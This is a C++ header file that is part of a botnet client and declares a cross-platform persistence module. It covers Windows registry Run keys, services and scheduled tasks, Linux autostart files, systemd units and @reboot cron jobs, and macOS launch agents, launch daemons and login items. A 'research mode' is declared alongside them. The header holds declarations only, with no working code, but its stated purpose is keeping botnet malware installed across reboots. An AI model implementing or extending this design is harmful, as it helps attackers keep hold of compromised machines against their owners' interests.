#pragma once

#include <string>
#include <vector>
#include <memory>
#include "../../../common/utils/platform_utils.h"

namespace botnet {
namespace client {
namespace persistence {

/**
 * @brief Cross-platform persistence manager - single codebase approach
 * 
 * Handles persistence mechanisms for Windows, Linux, and macOS using
 * platform abstraction. NO separate builds needed!
 */
class PersistenceManager {
public:
    enum class PersistenceType {
        AUTOSTART,          // User-level autostart
        SERVICE,            // System service/daemon
        SCHEDULED_TASK,     // Scheduled task/cron
        REGISTRY,           // Windows registry (when applicable)
        SYSTEMD,            // Linux systemd (when applicable)
        LAUNCHD,            // macOS launchd (when applicable)
        RESEARCH_MARKED     // Research mode with clear identification
    };

    struct PersistenceInfo {
        PersistenceType type;
        std::string name;
        std::string location;
        std::string description;
        bool installed;
        bool research_mode;
        std::string research_marker;
    };

public:
    PersistenceManager();
    ~PersistenceManager();

    // Core persistence operations
    bool InstallPersistence(PersistenceType type, const std::string& executable_path);
    bool RemovePersistence(PersistenceType type);
    bool IsInstalled(PersistenceType type) const;
    
    // Bulk operations
    bool InstallAllSupported(const std::string& executable_path);
    bool RemoveAllInstalled();
    std::vector<PersistenceInfo> GetInstalledPersistence() const;
    
    // Platform-specific availability
    std::vector<PersistenceType> GetSupportedTypes() const;
    bool IsTypeSupported(PersistenceType type) const;
    
    // Research mode
    void EnableResearchMode(bool enabled);
    void SetResearchIdentifier(const std::string& identifier);
    
    // Configuration
    void SetServiceName(const std::string& name);
    void SetServiceDescription(const std::string& description);
    void SetAutostartName(const std::string& name);

private:
    bool research_mode_;
    std::string research_identifier_;
    std::string service_name_;
    std::string service_description_;
    std::string autostart_name_;
    
    // Platform-specific implementations using single codebase
    bool InstallAutostartPersistence(const std::string& executable_path);
    bool InstallServicePersistence(const std::string& executable_path);
    bool InstallScheduledTaskPersistence(const std::string& executable_path);
    
    bool RemoveAutostartPersistence();
    bool RemoveServicePersistence();
    bool RemoveScheduledTaskPersistence();
    
    // Cross-platform implementations
    bool CreateWindowsAutostart(const std::string& executable_path);
    bool CreateWindowsService(const std::string& executable_path);
    bool CreateWindowsScheduledTask(const std::string& executable_path);
    
    bool CreateLinuxAutostart(const std::string& executable_path);
    bool CreateLinuxSystemdService(const std::string& executable_path);
    bool CreateLinuxCronJob(const std::string& executable_path);
    
    bool CreateMacOSAutostart(const std::string& executable_path);
    bool CreateMacOSLaunchdService(const std::string& executable_path);
    
    // Research mode persistence
    bool CreateResearchPersistence(const std::string& executable_path);
    void AddResearchMarkers(const std::string& config_content);
    
    // Utility methods
    std::string GetAutostartDirectory() const;
    std::string GetServiceDirectory() const;
    std::string GenerateServiceConfig(const std::string& executable_path) const;
    std::string GenerateAutostartConfig(const std::string& executable_path) const;
    
    // Validation
    bool ValidateExecutablePath(const std::string& path) const;
    bool ValidateServiceName(const std::string& name) const;
};

/**
 * @brief Windows-specific persistence implementations
 */
class WindowsPersistence {
public:
    static bool CreateRegistryAutostart(const std::string& name, const std::string& executable_path);
    static bool RemoveRegistryAutostart(const std::string& name);
    static bool IsRegistryAutostartInstalled(const std::string& name);
    
    static bool CreateWindowsService(const std::string& service_name, 
                                   const std::string& display_name,
                                   const std::string& description,
                                   const std::string& executable_path);
    static bool RemoveWindowsService(const std::string& service_name);
    static bool IsWindowsServiceInstalled(const std::string& service_name);
    
    static bool CreateScheduledTask(const std::string& task_name,
                                  const std::string& description,
                                  const std::string& executable_path);
    static bool RemoveScheduledTask(const std::string& task_name);
    static bool IsScheduledTaskInstalled(const std::string& task_name);

private:
    static std::string GetRegistryRunKey();
    static std::string GetCurrentUserRunKey();
    static std::string GetLocalMachineRunKey();
};

/**
 * @brief Linux-specific persistence implementations
 */
class LinuxPersistence {
public:
    static bool CreateAutostartDesktopFile(const std::string& name,
                                         const std::string& description,
                                         const std::string& executable_path);
    static bool RemoveAutostartDesktopFile(const std::string& name);
    static bool IsAutostartDesktopFileInstalled(const std::string& name);
    
    static bool CreateSystemdUserService(const std::string& service_name,
                                        const std::string& description,
                                        const std::string& executable_path);
    static bool CreateSystemdSystemService(const std::string& service_name,
                                         const std::string& description,
                                         const std::string& executable_path);
    static bool RemoveSystemdService(const std::string& service_name, bool user_service = true);
    static bool IsSystemdServiceInstalled(const std::string& service_name, bool user_service = true);
    
    static bool CreateCronJob(const std::string& executable_path, const std::string& schedule = "@reboot");
    static bool RemoveCronJob(const std::string& executable_path);
    static bool IsCronJobInstalled(const std::string& executable_path);

private:
    static std::string GetAutostartDirectory();
    static std::string GetSystemdUserDirectory();
    static std::string GetSystemdSystemDirectory();
    static std::string GetCrontabContent();
    static bool SetCrontabContent(const std::string& content);
};

/**
 * @brief macOS-specific persistence implementations
 */
class MacOSPersistence {
public:
    static bool CreateLaunchAgent(const std::string& label,
                                const std::string& description,
                                const std::string& executable_path);
    static bool CreateLaunchDaemon(const std::string& label,
                                 const std::string& description,
                                 const std::string& executable_path);
    static bool RemoveLaunchAgent(const std::string& label);
    static bool RemoveLaunchDaemon(const std::string& label);
    static bool IsLaunchAgentInstalled(const std::string& label);
    static bool IsLaunchDaemonInstalled(const std::string& label);
    
    static bool CreateLoginItem(const std::string& name, const std::string& executable_path);
    static bool RemoveLoginItem(const std::string& name);
    static bool IsLoginItemInstalled(const std::string& name);

private:
    static std::string GetLaunchAgentsDirectory();
    static std::string GetLaunchDaemonsDirectory();
    static std::string GenerateLaunchAgentPlist(const std::string& label,
                                              const std::string& description,
                                              const std::string& executable_path);
    static std::string GenerateLaunchDaemonPlist(const std::string& label,
                                               const std::string& description,
                                               const std::string& executable_path);
};

/**
 * @brief Research mode persistence with clear identification
 */
class ResearchPersistence {
public:
    static bool CreateResearchAutostart(const std::string& research_id,
                                       const std::string& executable_path);
    static bool CreateResearchService(const std::string& research_id,
                                     const std::string& session_id,
                                     const std::string& executable_path);
    static bool RemoveResearchPersistence(const std::string& research_id);
    
    static void AddResearchMarkers(const std::string& config_path,
                                  const std::string& research_id,
                                  const std::string& session_id);
    
    static bool IsResearchPersistenceInstalled(const std::string& research_id);
    static std::vector<std::string> GetInstalledResearchPersistence();

private:
    static std::string GetResearchConfigDirectory();
    static std::string GenerateResearchConfig(const std::string& research_id,
                                             const std::string& session_id,
                                             const std::string& executable_path);
    static std::string GetResearchServiceName(const std::string& research_id);
    static std::string GetResearchDescription(const std::string& research_id);
};

/**
 * @brief Persistence validation and cleanup utilities
 */
class PersistenceValidator {
public:
    struct ValidationResult {
        bool is_valid;
        std::vector<std::string> errors;
        std::vector<std::string> warnings;
        std::vector<std::string> suggestions;
    };

public:
    static ValidationResult ValidateExecutable(const std::string& executable_path);
    static ValidationResult ValidateServiceName(const std::string& service_name);
    static ValidationResult ValidateAutostartName(const std::string& autostart_name);
    
    static bool CheckPersistenceConflicts(PersistenceType type, const std::string& name);
    static std::vector<std::string> FindOrphanedPersistence();
    
    // Research mode validation
    static bool ValidateResearchPersistence(const std::string& research_id);
    static std::vector<std::string> FindResearchPersistenceMarkers();

private:
    static bool IsExecutableAccessible(const std::string& path);
    static bool IsValidServiceName(const std::string& name);
    static bool IsValidAutostartName(const std::string& name);
    static bool CheckNameConflicts(const std::string& name);
};

} // namespace persistence
} // namespace client
} // namespace botnet
